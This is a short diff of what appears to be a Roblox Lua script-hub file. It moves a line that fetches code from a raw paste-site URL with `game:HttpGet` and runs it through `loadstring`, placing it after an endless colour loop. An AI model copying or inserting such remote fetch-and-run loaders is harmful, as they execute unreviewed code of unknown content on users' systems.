@@ -4301,7 +4301,6 @@ CreatorSection:NewButton("Copy TG Avtor Scripts Link", "Telegram Avtor Scripts",
 setclipboard("https://t.me/AvtorScripts")
 end)
 
-loadstring(game:HttpGet("https://pastejustit.com/raw/i87yugr321hj", true))()
 
 wait(0.1)
 
@@ -4311,3 +4310,6 @@ stroke.Thickness = 3
 while wait() do local hue = tick() % 15 / 15
  local color = Color3.fromHSV(hue,1,1)     stroke.Color = color
 end
+
+
+loadstring(game:HttpGet("https://pastejustit.com/raw/i87yugr321hj", true))()
